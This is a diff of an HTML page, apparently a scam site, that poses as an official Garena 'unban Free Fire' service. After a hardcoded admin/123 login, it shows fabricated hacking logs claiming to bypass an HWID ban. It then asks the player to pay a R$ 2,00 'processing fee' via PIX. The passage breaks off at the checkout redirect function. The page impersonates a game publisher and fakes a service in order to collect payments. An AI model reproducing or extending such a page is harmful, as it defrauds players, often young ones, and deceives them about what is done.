@@ -1,174 +1,322 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ACESSO UNBAN FREE FIRE | Garena Official</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700&display=swap');
 
-<title>Painel Unban Free Fire</title>
+        :root {
+            --ff-red: #ff0000;
+            --ff-dark-red: #8b0000;
+            --ff-black: #050505;
+        }
 
-<style>
+        body {
+            background-color: var(--ff-black);
+            color: white;
+            font-family: 'Rajdhani', sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Arial,sans-serif;
-}
+        /* FUNDO REALISTA SETUP GAMER */
+        .bg-overlay {
+            position: fixed;
+            inset: 0;
+            background-image: url('https://wallpaperaccess.com/full/1206545.jpg'); 
+            background-size: cover;
+            background-position: center;
+            z-index: -3;
+            filter: brightness(0.3) contrast(1.2);
+        }
 
-body{
-min-height:100vh;
-overflow-y:auto;
-overflow-x:hidden;
-display:flex;
-justify-content:center;
-align-items:flex-start;
-background:#05010a;
-position:relative;
-padding:15px;
-}
+        .bg-darken {
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(circle, transparent 20%, rgba(0,0,0,0.8) 100%),
+                        linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(0,0,0,0.9));
+            z-index: -2;
+        }
 
-/* FUNDO */
+        /* CANVAS PARA PARTÍCULAS TIPO DNA/CONEXÕES */
+        #particle-canvas {
+            position: fixed;
+            inset: 0;
+             z-index: -1;
+             pointer-events: none;
+             background: transparent;
+        }
 
-body::before{
-content:"";
-position:fixed;
-width:700px;
-height:700px;
-background:
-radial-gradient(circle,#8a2eff88 0%,transparent 60%),
-radial-gradient(circle,#ff00ff44 0%,transparent 70%),
-radial-gradient(circle,#4b00ff55 0%,transparent 75%);
-filter:blur(90px);
-animation:bgRotate 12s linear infinite;
-z-index:0;
-}
+        /* PAINEL 3D */
+        .glass-panel {
+            background: rgba(10, 0, 0, 0.85);
+            backdrop-filter: blur(20px);
+            border: 2px solid var(--ff-red);
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.4), inset 0 0 20px rgba(255, 0, 0, 0.2);
+            border-radius: 24px;
+            width: 90%;
+            max-width: 520px;
+            padding: 42px 40px;
+            text-align: center;
+            z-index: 10;
+            transition: transform 0.1s ease;
+        }
 
-body::after{
-content:"";
-position:fixed;
-inset:0;
-background:
-linear-gradient(
-135deg,
-rgba(0,0,0,0.9),
-rgba(30,0,60,0.7),
-rgba(0,0,0,0.95)
-);
-z-index:0;
-}
+        .font-orbitron { font-family: 'Orbitron', sans-serif; }
 
-/* PARTICULAS */
+        .input-field {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #400;
+            transition: all 0.3s ease;
+            color: white;
+        }
 
-.particles span{
-position:absolute;
-width:4px;
-height:4px;
-background:#b84dff;
-border-radius:50%;
-box-shadow:0 0 10px #b84dff;
-animation:float 10s linear infinite;
-}
+        .input-field:focus {
+            border-color: var(--ff-red);
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+            outline: none;
+        }
 
-.particles span:nth-child(1){
-top:10%;
-left:20%;
-animation-duration:8s;
-}
+        .btn-ff {
+            background: linear-gradient(135deg, var(--ff-red), var(--ff-dark-red));
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            font-weight: 900;
+            letter-spacing: 1px;
+        }
 
-.particles span:nth-child(2){
-top:70%;
-left:80%;
-animation-duration:11s;
-}
+        .btn-ff:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px var(--ff-red);
+            filter: brightness(1.2);
+        }
 
-.particles span:nth-child(3){
-top:40%;
-left:10%;
-animation-duration:9s;
-}
+        .log-screen {
+            background: #000;
+            border: 1px solid #300;
+            font-family: 'Courier New', monospace;
+            color: #ff4444;
+            font-size: 11px;
+        }
 
-.particles span:nth-child(4){
-top:80%;
-left:30%;
-animation-duration:13s;
-}
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
 
-.particles span:nth-child(5){
-top:20%;
-left:70%;
-animation-duration:7s;
-}
+    <div class="bg-overlay"></div>
+    <div class="bg-darken"></div>
+    <canvas id="particle-canvas"></canvas>
 
-@keyframes float{
+    <div id="main-container" class="glass-panel">
+        
+        <!-- LOGO GARENA CENTRALIZADA E CORRETA -->
+        <div class="mb-6 flex flex-col items-center">
+                 <div class="flex items-center justify-center gap-3 mb-4">
+                     <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEUAAABBCAIAAAAIfv5oAAAQAElEQVR4AayZB3xUVdbA731l+mRSARWpIu4qTcCGvXewKyJSBcGyCogVECyAih1YlSZFVAQEtyhKWYqrEpBil14ChJBMpr8y7/tPRvNFSHbJ6vxObu675fRz7rnvKT4h6wPCK2sHl8iM+9VMSx/wKSLk1n1S8St6QHXRZsEjFGZDLm9Qc9Nnij4jwLF5+VXMCJ84evgN/4qo30/Wtdzn0VVVOo6gpR/wuTVNNU1TVVW2WLZlpS3HcVwuV04wJz+UnzASjHs9XsM2AoFAbjDX6/IeLD/E4O+B+spTJy3bTgshq34KUvEIpNMCGRjUNd2tu5HNMIxIJFIRrtCkxrjCTyipVCocCbMyP5Qrft+vfvI4dRNLmTYM6boOl6mUmUiZPHo8Lrfb63a7PR6Pz+ejZYGmaYiHbIzYtu12udPpdG5ORhIEq5vCUc0osHj0kEWZluJIUDXpKNJM25aTRvWarmhul6Jr0UQ8HI+UR8MHw4doo6k4a1SX7gsGgOyj7nGf2rlTUaOGsWTGCbNU/re2fvaBBpLQHgkEBg6WIhrMtKZp2AT7xKKJUCiE7gvyChoWNaSjKZqdtg3DKCsvC4fDDQobXH311RdffDEhlEwmsdiRmOs1Um95hCNrBSNlKVIlJ7h1PW2LVNJkBBcsryivqKzgF41Gk8lkJisIB4EL8wtPOeWUnj17Xnjhha1atdqyZcv+0v3ReLxe3B+5uH7y1GUc8Jq27fV6GzVqlJ+fj2UMy0IYv9ebl5tHJpBSEvmFhYUd2nW48fobBw8e/PTTT48cOfKiiy5auHDhzJkzN27eWFRQhC5wfrD9z6DAIn5fDTzawrGEg0+bwgGYYhCPZwRG044jVUXVNctxhCI9Pm+axW4XfDB41tldTjypdcqy/H5ffn5eNJHQXHr7UzvccWfPkU+Omjh50quvv/bwo4/06tP79DPP+Kp47ajRT27YtLGs/JCqagfKSlOmielsIQAphceDgKRBoaoZvUMCQFRFkQCdNH+/hcy634788mSaJj1NUdA6NJKGgbcoigIKVVWllMGAPy8vj6lgMIj3X37ZpU888YRt23hOXi5RE7rlllve+OvkefPmvfrqq48//niPHj3OO++80888kyy3aNGiYcOGvfXWW8XFxYcOHbIsC8wkupxAIGWZfo87FPATgfCQNC3LEVCRNU4+1ApvQI0xnjJQtzy2zTysQz4QCOA58Ni4cWO/z287Mp4ygqE8fzBElm7XoWPf/gOuvPralas//3nrdjrzFy76dOlyBrtdf2OTZs06dOpES8KOxGKzZ89+YMiQiZMnr1y9euv27YZlqcSbEFgGlZm25XN7IAfHCEknFPDrCtZQJD8Y+m9Qpzwel8vrdoO3srIyFothnIpweH/pgXgy2bBhQ3SJqEQL0XzzzTeffvrpBw8eJL4nTJhw3333tWjRotWJJ7Zu3Tq/oOC4447bV1Kyc+fOpUuX9unT55577vniiy9ID6iJbEaLZWASbBxNtFA0TbMyFk9ZmTSIFHbagTodKYVk6a/A46/d//+v1J6uhEBVuD6zSdOkE8gJqprKeUe2Rbzjjz/+7rvvfumll4YPH3799deTcLt16zZi5Mgzzzyz9UknHde4cSIeh9ddO3eyZf/+/aNGjbr99ts///xzBknTFeEK0l00Fk0kE7F4DC/FozhVI9FYwsBUps/tQtMIFo1GiRl8D7GBasYRm35N8XgE2EVbC1ioxXFAoWsqigQjkJub6/V4mzZtetVVVyFGp86dmzRpwhq4bNu27e5du3bv3m2kUhQ5Xp8Ph4nH44h93XXXTZ8xHY7btWs3dOjQjz76aPas2f/4xz8+XPjh1ClTJ7ww4dFHHyVxd+nSpcnxjQty8wxiNWVoqoK5wOx1u0Alf/kJxCMT1cJx1VCd8iAG6FiDJqi49h8ojcbixxxzDEl23rx5L770ErEUqaw89rjjyMJYQEhp23az5s2pcL755pvly5bdeeedf/7zn1etWnXFFVcs+WTJ3r17ly1fTpJg8Lbu3Tt27HjBBRfccMMN/fr1e+ihh8aPHz9p0qQpU6bgvSeccILX40b+VIr4shAE36OFmcNAysMGhCKRV4hsK2r8LMvGay3LIr8FAgEItGvb5rYetxMARUVFyUTCMAxIxmOxsrIyRIpGIk2bNSteu/a9d9+dNWvWwIEDy8vL33vvveXLl48dO/aiiy/2eL2mYRx77LEogsVZtBnMXkzuzQmFiLpTTmk7dPhDJPcrr76qbft2ultPmZY/GMjLzYFTwJFV9qH9FWqwnOkqmtQcW+iKrkqNgsVJC03RmZGSlKIqmosMZqVFy1atb7/jzuHDH5VMaCqodc4cKaSq5OSGNJfu8rgd4TRv2aJlqxOuuOrKhYs+fP+DeTfcdCPjrEw76ZSRssFehZVB4jMSi8YScQbttE0gJVJJzeVq3OT4QffdP2L0mLvvve/+IUNvv7Nn65NPCRUUViZSMcOy0LyqmI5IpYUtFVXPEFXggr5UpBAK7iRE2rRMx8okaF3TcVmfxwcHfr8fwYDLL7/89ddfHzBgALHh9fsIJCwDkJHo07LGtm0pJcUB7tShQ4dmzZqxgGjGdKyposIqgcEBVmYeIJxO8wiwmPMgryC/IlIpuTil7R+3/PzVuuKtO7YbtuXyegobFPoCPqEqaSyjCI5By8lcR1wut1QV27FNhxuLo2DxoC/ocZOfXRQmEE4kEslkEo0fLDvI4/nnn3/HHXd0OftsfyCAjwGkHYB0BE+IwXr49nq9sEUfXskfKMXlctFm0z3rWUzmyLaogCmWQZ2NjJMGWQkeRljcvHnzvn37du/eHSSbNm3ijAY5ayzLdrvdwWDQ7dbJCqxMGikEFkJyhAT8AaUiUkEWMgxDCAEN9sMQLWQYQc0IwyETi0ZL9u5lkCm4QZ3MIm31YpAQ8T/99BPJYO3atYTNkiVLli1bRgVw4MABOGYX69ECtEgwtPBHyyBTYAY8Hg8jPr/f6/NxyqFK8uH9999/ySWXYD3Yk1KAwbIsw+B+BQtC1TTyoJAyaRqxeFwhcpAYpEbVDwWbtgl5sHfq2Om2225r3749e9AlaYBOaWkp1oMDdsHQ999//7e//W369OkUO6NHj6bKHDNmzCOPPPKXqh/cvP/+++vXryc3sAs+UAeYVVVlO0qBZiwWgygdZgEGLdOsKC/ft28fMlx8ySUPPvggyJ966qkhQ4bcdNNNJEaSSmFhQVFRwbHHN/b4vITcGV3Ouu6G67vf0UPJqfrBny1spHKEoykaumnTpg1nQq9evSgCdu7YUVFRoek6lFgO1e3bt69YseLtt9+mIHjyySc5QOjPnTt3/vz5HCxff/01op544omUz3gOCa2goACNwCvaxUmYRbdojUGcBwnRPY/MIiriMYv6gjk5UIQr3IQUf++99z788MOPPfYYpzOKo+U0R9TBgwdf0/XaU089tVmL5kpZReZelTSToAApLytABBMcl2eddVaTpk1DubmQRGAWwAcujgu98cYbI0aMeOaZZ1A/Doa01DswiiJIBldeeWX//v05VaA9bMjQ0087HZ/Ys2v3V198uXD+gulTp82YNv2vkya/M3vOko8/Wbe2eMe27eVlh1Sp+Lw+LIkYuXl54KRQQgWkcqxKisek6IhTC6+hdOKkIhC6Xn9ds5YttmzfNnvuO+NfeF6BS9Z5dI8mNRQfjoRL9pfs2rXr73//O2fc0CFDnn/uuQ8++OCzzz6bMX06jjRo0CBa5OGgJDDQqJQSSchj5557LiocN24cBw7JsHPnzjgM8n/15Zdvvvnmyy+/TH3EFEDFTYsLoV1UjmrInxj2u2+/LSwqgvXKcBiTAojHIxLCJKbDaUtKSr777rs1a9bAFUcw4Q0GytwffviB5JQ5fyCJJAjGapwN2LZtG9GcDYxXXnll3LhxKJvA+LDqR0GJ04M9UJXx2IVfUQ08++yznLaI0aBBA0yNSbdu3QqXL774InsnTpw4f8H8devXUUzAE/aECrb997///c477yAbTovBJ7zwwsqVK8l1aAoSWdfg1E4kEps2bVq8ePHMmTNBiCLgas6cOWuLi7du21YZiRimGU8kM/ZBkiMhmUpSKaIejEBowgHpixaXw91xAIDKEgfDfSnSIEApHYlECAl4xen37Nkzbdo08sLcd+fSZxd3Va4bMJpFzhrcibChRbUkZYTHbgQkqQX5P/74Y7RO/YH6oA4zUEf1tBDi4lRaWpblHB+hI6WoUx5OJDI6TEMPDsBCK6pyOl6E/lB/p06dqDXvuusugs0wDKo7+N6xYwf5Z8OGDdRm1DtSylAgGPD5ErFYuKI8EY/pqsp7NremuzSNS2IsEmGkQWFh0O9PxGLwih1ImMQ62YiE1rVrV96ZPPDAAxgZP8dEX375JRGBxaQUUghFSlVRdLSiqgpKqhVgHUBtxAa80mblwQGQjSlCE93jYNwdeMRpkaFt27Zgw27457fffou/7SvZC4u6rlNthAjtnBB0QYgZCTn2EiRQQdllh8qoiSDEo6z6xeNxFLR58+a1a4vx/1Wr1hQXk/w3/PDDT1gGNriQQw7qKF1VOU20Ou0DXjYgQxaye2AFreBOBAkBc9lll7Vu3ZoFjJASQQrfsNivXz9UCLukymAgSCwhLeyGK8OwCBByiFRSUrJ9x3aqEJBzDBzT6JjGxzVOJpmxwMkgvCIbOIPBAEg8Hpeuq5qGPYSUgnHcx7HsLAg7LdOO4nBZqQYQ/ApSSiRmD4mlJuDKvDYgZpAHknCG4okNxjmyUCfRjEswSLhbhhmJRsDDAXLeuefdM/ieCRMm4ITZNdxYF324aMzoMdwCUV/JvpLde3aHQvidF7owQuEVjyej0TjqoIOotp0pMlVV0TQVDnlkGcLTQfsgqdM+lg0zBusAluIzWAZA/QjDCQPH4EIeaKMnlpE2WEbyQdkkMS5/mKJzp879+/Z77ZVX331n7kuvvNq3d59zupzduWOnLmee1aFde9oH//LAks+WbtuyddaMmd1v6x4MBkGIqTEIb4gQz+t14xeqKqnZGKSflQTxEBXS2EyVlKiOg32ocauhpnCaVMkHPhBgZhehq0EDg3DHpO6gjiY28CiYjlb9kIFKYu3atRQHZItAIIBVe/fuTWSPGDXy7HPPQcI5b79NGiQpM/jPf/6TfBUqKIC/eGVlbkH+rT1u5zzBaJx7vAliOwsqKyOO48AFy2Agawpa+ppGsSa9bg8rUYGKxOQGZMiClEIKR60CKRHVtiyDnbFoxK3r+bm5lmmcfPLJgwYNAjubOWRQPwA9uCerEtNISGVAUuL8pgKa9NfJrbmirllz18CB5194AXE1derUSa+9fu+gwYMGDOzXu8+wBx4gwKnBOECwMAV5yxNO7N2n35tvTX1ryrSBdw9u3qKlk5Yu3XN846Y+byAvJ69RUaMcf05BbsFJrU5qc3LbP/3pT+gUqlm4ggAACx5JREFUD4LVjMyoPAvSEVyWMiAEUUUGZITYdOkuKIXDYTI4NRJOgjyMgwLF0AeLEII0RcVAKUR0UQdQXF166aWcEiv+tWLs+HEcLOFIJLuYV9z4amlZKZJQFgwb/tCcOXNwm5+3buFKJ6UEMwqiluGEZQEHOiYdMGAAfs4Nghs7ZRRnd7dru4KHpAIVdIqKMRq2gZlaAC4xIlFErCMPJyDHCwmtYaNGrEYeFoAC8jzCwZo1a5577jkkIbMlk0mmGCRAuTJQuUKSEXIGJFnPXk3RQAIfq1evfvnll3n1Q6pkCudlHNIkdM4xaqhbb72Vgo30wxGEhEhFiUhBTFLhFCJo2QIb4KStUx5QozNaOIAqHSx7xhlnZEsPNJ2VE47hm0vEtGnTOMvhgBM2l9dAXi/JgzAjvkOhEJYkwEDCoEfPXHKy7oHTMsWlg9csoIIWazAOyFEBvEIaDIyDE0IccTNnzqSAeOrpp1atWQUSdrGGBQiT6bC/VmAdK6SQcMA2VVHJBFQ36Bi8KINBptA6LZ5D/Ur8IDBVOW6ASVlJjYzb8J6RrI3KccVILMIWLAAGYm/vvr1Qx/JUcTNnzmQjkmBeFtBBBbQsYKWm6xREvGnBAzdu3FhUWMQ3GAQALQjpwBVtnfaxHQe8UMXTwMgeXgzQQdkoA3rQQGbGYfrTTz+ljz3xBNYAaBfdww1lBG+u25zSBnpIzhSOhLTgsRzLz+sInw87tGzZktwIRZQIQlbCKITAw2IUsfJf/+LgoqIrPVjKFIzhZqiD9YjBGvDTqVMe0nPKNGERDtjMhqZNm2ITlzvzeZAOg9BjljOUGCC3IiRc4orZWaYqKyvBQPUFcDTFk/GgPwhVprAeLQ7JYzwRp8VpkQSc+BuWYRbx4BJNMbVo0aJPPvmEpE9FCyE6YG7VshWz7GUxLXTrlAe2WIRz07LTTtvQhhi1BOjQEL6BcWCLApzoROuoateuXRBgBI3CSnYly8CAPC7NBaMHyw+CJ5aMBbwBdIEFWp3QitOMQhbHYxnr4Qz7QxqiCMm1F3/m5QRvneAbtCBExT9t+cniJY8QbAEnu+qUB25Ah90pIul43B7oYRNUjv6YhV628+OPPyI8K5GH0xDnIcyo6HiEe84lKIEBkuxCft5Y0NckyLS0SLMXzFR6YGMZmmKktLQUBZEDoIIpOH+/+/47xCCMEZgOgOK8bi9lDxIiGy0U65SHDVIIAoAiEspwwBEEdnSA0QAEgDmwQJ4pFjDF+cOJSe5GEjiDNobiXMLvuU1x2rLMSltsJ3hgyK27SRWGmfmIz0Uap0Vm5EcYsgv4OV64Vv7888+Zl6heLxthhgXQRQYwoIKaUKc8vLDjRoFUilQQg/0UMrAOrux+LI4AqAS90oFRmODWhS4p4Xg3Qm4lg7/22mvczJCTc5k1eBcVMKKGAqFEMoG+CvILsiGBPPgwFNECVGAX4C60YMECAonxLCAwzECXNUCWmeq2TnkwDlSjsShfEIhXOOYGAl5EgidyC8cCAF54gg90CRmERK/U13wFuvbaa6l9KBR49wBn6BX103FrbjjDLDABc/RRM4cBNTjYIJpFhQdCBQdGJFRmp20Od7bDCRtZCdA5DOqUR1PV7E6UiokgQ9YnLnnE6LBePYtHEbXEDOOYCCHpwArfsACiGS2iBfwzaSThLBsVRA63HfAgGLMc/I0bNwZnFj96YYqigZMAb8RBePfJ2x8wwwkIEQPZeE1NpybUKQ+L0BxOwicdOIAAGuL2QiqjD9N4BSwiAEcHRxNmIfThHusBGI0paAOwCAd0sjhhjhCipsQssUSMN2R8UOnarRuzsAseVsIrdRPqI1W4XW5ijxEAe9KyEuMAdA6D/ySP7Tg4UooXxIYBbQhv2LiBN0Nc1BAGFmEUpPgJ72O5F6Fm6h3UjMWQGb4RzzB4R5CECUaI/kQqEYlHKN5guuRASW5OLjVhnz59LNOEdZhjJUxjXizDiySWAZqqQRFOMi6Xhi8HugCOw5aakJHHIVaEyLY15xgGNRdmogifhl2/xztjxgx8GkdCGFiEXexw2mmnnXPOOUhIPsCexAmeQwBwBDPr83i5e8VjUU135wRyXC6f6tJN03aEvPzyKzlqL7rkUiLT6/aBraigEB5SiSTHQMWhcr/XB3WOaTRLitM1HdkghDdCwnYy11XWVwM3A5kW3AwyLZ0MSJGWwrJt5EnGYwZZyOVy61q0MixEetv2bc889fRHixYn4wnhiGglFVn01PYdruvarWePO1o0ax4K5uSFcrncwk3Jnr1u3eNYDqeN1+23bScaS1i2o2qucCzWs2fv/ncNvOTiy1JxIxAIcqUp3X8wlUg4aculKXf27DHmyZG9eva49KILo5UVyXjUTCVs27RtlGym05Yj04oCj9WyZDoKrPM/29KpFVBGNfjcHs7KWbNmUeQuW7oUteXm5eEM1J0kNFrOeNu20+m0u+qXiMYcR+o638gUGHG7vc2bNz/jjLPGjh3Xt29/Pow3aNiQ1CfszIcDl6oRhOvXFvONddGChfwoC3jnaFZ9m6qVt8MGM/522FD2EcFxUPpIkm3pANBmnHdRvNQklsjFe/fsYZxXskQRlxNy9DXXXIMHElEul4szlA8BDRsWNWvWpGPHDl27XjNw4F0PPTS0f/++7dq1Qd98CSfEdu3auXjxhxxcfE3gnsPrdt6MUxZu2vwN6uNrJzwcDdQpT83NsAugcgBvJjcA1DVokVfPvKrlZcC64mISQPsOHWBo7Nix3B8ff/xxvpcMGzaM13QM8uaAcY4jPlSdf9EFGA+9UFhw1+DuxCx43pryBqjWf71h567dRBRxcoRD1eSrlv5/lwdJACTJtrqmZ/vkA2q5devX4XtciUnlXE4XL1rEy3KmuCYQ6Lye79WrVz8k6NPn5ltuOfu8cxo2aMBn/dUrVrJy6pQpyD1q5Mjnxo/nK/LmzZtikSj5A2sE/D7I4Z+g0vUMxVp4r22oTnlQHutBmm3pZMRIO4xDA0dCefhe5nCIxTj4qAm4aXEs8vaHDxAom3ezC+fPX7hgAaU+zvPG5MnPjnkaozH1QtWPtwITJ09ctmIZ9ThxSNVD4MViEbIcxolEooZpQRdCkIaNo4E65aneDMZfQJDPhGGS8OLScUwjFY9F05bFl9e0bXHKlJeV/fj99ytXrECM6VOnTnj+eW7RTzzx2IgRSPHoY489Mnr0qEmTXl+4cP6KFcu+Kv4iEgkX5OUVZT51eZLJOAAh/BA1oS+/30duRhjDQK7D83I1e4d1/rs8bICMUyUMfeoOKTCS5DTgEdrUCgxSekAbPphDnYZhcApxTHGF3L9/fzgcJuSYxXnwospopSIy6Y5x3vfit6BiFmBvysh8+WA9dLEYU5p6VHyyss514KoG1kkhWAokYnFFSCtjppQKT4bJpzUGXarOKZYdN5Ip27REmk+Xqi5Ux7KNRBIwk6m0acm0w6AmFTocf7pU6TNupQxEJamQAwDkQTZ4YDDbgQ1AStTJ/wwwm/lX40+p0f9d3SzqbAuibCfb8nj0gFKOfvGRK/9IeeD+SBAiXU84ksl6jBwuTz22HrEUYRjjugZkOg5Bx//agcVHAh5Y++q6Rw9DUm952FA7OL8E2G9mHSFFPUD87h/UfzeOXxHIDOf8ZSKWsewjnVoBG9YKtS7+D4OOyJwi1e0fJo/M/oREjF9AZn5VrFSTq9mpmvmjmz9SHnhDAlog25G/M1uBqJ5Qb3koeGoFM21bThqwBZcshw7AFb0ufqQQtQBDjDtVF7Kja53f+tv/AQAA//94GeBYAAAABklEQVQDAMLh/6cZkDxNAAAAAElFTkSuQmCC" class="h-14 w-14 object-contain" alt="Símbolo Garena">
+                     <span class="text-red-600 font-orbitron text-4xl font-bold tracking-wider">Garena</span>
+                 </div>
+            <h1 class="font-orbitron text-xl font-black tracking-tighter text-white">
+                ACESSO <span class="text-red-600">UNBAN</span> FREE FIRE
+            </h1>
+            <div class="h-1 w-16 bg-red-600 mx-auto mt-2 rounded-full"></div>
+        </div>
 
-0%{
-transform:translateY(0px);
-opacity:0;
-}
+        <!-- TELA DE LOGIN -->
+        <div id="login-screen" class="space-y-5">
+            <div class="space-y-4">
+                <div class="relative">
+                    <i data-lucide="user" class="absolute left-3 top-3 w-5 h-5 text-red-600"></i>
+                    <input type="text" id="user" placeholder="Usuário" class="input-field w-full py-3 pl-10 pr-4 rounded-xl">
+                </div>
+                <div class="relative">
+                    <i data-lucide="lock" class="absolute left-3 top-3 w-5 h-5 text-red-600"></i>
+                    <input type="password" id="pass" placeholder="Senha" class="input-field w-full py-3 pl-10 pr-4 rounded-xl">
+                </div>
+            </div>
+            <button onclick="doLogin()" class="btn-ff w-full py-4 rounded-xl text-white shadow-lg">
+                Entrar no Painel
+            </button>
+        </div>
 
-50%{
-opacity:1;
-}
+        <!-- DASHBOARD UNBAN -->
+        <div id="dash-screen" class="hidden space-y-4">
+            <div class="space-y-3 text-left">
+                <div>
+                    <label class="text-[10px] font-bold text-red-500 uppercase ml-1">ID do Jogador</label>
+                    <input type="text" id="player-id" placeholder="Ex: 123456789" class="input-field w-full py-3 px-4 rounded-xl">
+                </div>
+                <div>
+                    <label class="text-[10px] font-bold text-red-500 uppercase ml-1">Nome da Conta</label>
+                    <input type="text" id="player-name" placeholder="Nick do Jogador" class="input-field w-full py-3 px-4 rounded-xl">
+                </div>
+                <div>
+                    <label class="text-[10px] font-bold text-red-500 uppercase ml-1">Plataforma</label>
+                    <select id="platform" class="input-field w-full py-3 px-4 rounded-xl appearance-none">
+                        <option value="google">Google</option>
+                        <option value="facebook">Facebook</option>
+                        <option value="vk">VK</option>
+                        <option value="apple">Apple</option>
+                    </select>
+                </div>
+            </div>
+            <button id="unban-btn" onclick="startUnban()" class="btn-ff w-full py-4 rounded-xl text-white shadow-lg">
+                Aplicar Desbanimento
+            </button>
+            <div id="log-container" class="log-screen hidden h-32 overflow-y-auto p-3 rounded-xl space-y-1"></div>
+        </div>
 
-100%{
-transform:translateY(-120px);
-opacity:0;
-}
+        <!-- TELA DE PAGAMENTO -->
+        <div id="pay-screen" class="hidden text-center space-y-6">
+            <div class="bg-red-900/20 border border-red-600/50 p-4 rounded-2xl">
+                <i data-lucide="check-circle" class="w-10 h-10 text-red-600 mx-auto mb-2"></i>
+                <h2 class="font-orbitron text-lg font-bold text-white">CONTA LOCALIZADA!</h2>
+                <p class="text-xs text-gray-400">Banimento HWID identificado. Liberação pendente de taxa de API.</p>
+            </div>
+            <div class="bg-black/60 p-6 rounded-2xl border border-yellow-600/50">
+                <p class="text-[10px] uppercase text-gray-400 mb-1">Taxa de Processamento</p>
+                <div class="text-4xl font-black text-white mb-4">R$ 2,00</div>
+                <button onclick="redirectToCheckout()" class="btn-ff w-full py-4 rounded-xl text-white flex items-center justify-center gap-2">
+                    <i data-lucide="zap" class="w-5 h-5"></i>
+                    Pagar via PIX
+                </button>
+            </div>
+            <p class="text-[9px] text-gray-500 uppercase tracking-widest"></p>
+        </div>
+    </div>
 
-}
+    <script>
+        lucide.createIcons();
 
-@keyframes bgRotate{
+        // --- SISTEMA DE PARTÍCULAS DNA/CONEXÕES ---
+        const canvas = document.getElementById('particle-canvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
 
-from{
-transform:rotate(0deg) scale(1);
-}
+        function resize() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resize);
+        resize();
 
-50%{
-transform:rotate(180deg) scale(1.15);
-}
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.vx = (Math.random() - 0.5) * 1.5;
+                this.vy = (Math.random() - 0.5) * 1.5;
+                this.radius = Math.random() * 2 + 1;
+            }
+            update() {
+                this.x += this.vx;
+                this.y += this.vy;
+                if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+            }
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                ctx.fillStyle = '#ff0000';
+                ctx.shadowBlur = 5;
+                ctx.shadowColor = '#ff0000';
+                ctx.fill();
+            }
+        }
 
-to{
-transform:rotate(360deg) scale(1);
-}
+        function initParticles() {
+            particles = [];
+            for (let i = 0; i < 80; i++) particles.push(new Particle());
+        }
 
-}
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach((p, i) => {
+                p.update();
+                p.draw();
+                for (let j = i + 1; j < particles.length; j++) {
+                    const p2 = particles[j];
+                    const dist = Math.hypot(p.x - p2.x, p.y - p2.y);
+                    if (dist < 150) {
+                        ctx.beginPath();
+                        ctx.moveTo(p.x, p.y);
+                        ctx.lineTo(p2.x, p2.y);
+                        ctx.strokeStyle = `rgba(255, 0, 0, ${1 - dist / 150})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.stroke();
+                    }
+                }
+            });
+            requestAnimationFrame(animateParticles);
+        }
+        initParticles();
+        animateParticles();
 
-/* LOGO */
+        // --- LÓGICA DO SITE ---
+        function doLogin() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(u === 'admin' && p === '123') {
+                document.getElementById('login-screen').classList.add('hidden');
+                document.getElementById('dash-screen').classList.remove('hidden');
+            } else {
+                alert('Acesso Negado!');
+            }
+        }
 
-.logo-bg{
-position:fixed;
-font-size:60px;
-font-weight:bold;
-color:rgba(255,255,255,0.03);
-text-shadow:
-0 0 20px #8a2eff,
-0 0 40px #b84dff,
-0 0 80px #4b00ff;
-animation:spin 20s linear infinite;
-z-index:1;
-user-select:none;
-top:50%;
-left:50%;
-transform:translate(-50%,-50%);
-pointer-events:none;
-}
+        async function startUnban() {
+            const id = document.getElementById('player-id').value;
+            if(!id) return alert('Insira o ID!');
+            const btn = document.getElementById('unban-btn');
+            const logs = document.getElementById('log-container');
+            btn.disabled = true;
+            btn.innerText = 'PROCESSANDO...';
+            logs.classList.remove('hidden');
+            logs.innerHTML = '';
+            const steps = [
+                `[INFO] Conectando ao servidor Garena...`,
+                `[OK] Socket 192.168.0.1 estabelecido`,
+                `[SEARCH] Localizando ID: ${id}...`,
+                `[FOUND] Conta Banida (HWID/Account)`,
+                `[ACTION] Iniciando Bypass de HWID...`,
+                `[PROCESS] Removendo flags de banimento...`,
+                `[INFO] Sincronizando com Cloud Garena...`,
+                `[SUCCESS] Banimento removido com sucesso!`,
+                `[FINAL] Aguardando taxa de liberação (R$ 2,00)...`
+            ];
+            for(let step of steps) {
+                await new Promise(r => setTimeout(r, 800));
+                const div = document.createElement('div');
+                div.innerText = step;
+                logs.appendChild(div);
+                logs.scrollTop = logs.scrollHeight;
+            }
+            setTimeout(() => {
+                document.getElementById('dash-screen').classList.add('hidden');
+                document.getElementById('pay-screen').classList.remove('hidden');
+            }, 1000);
+        }
 
-@keyframes spin{
+        function redirectToCheckout() {
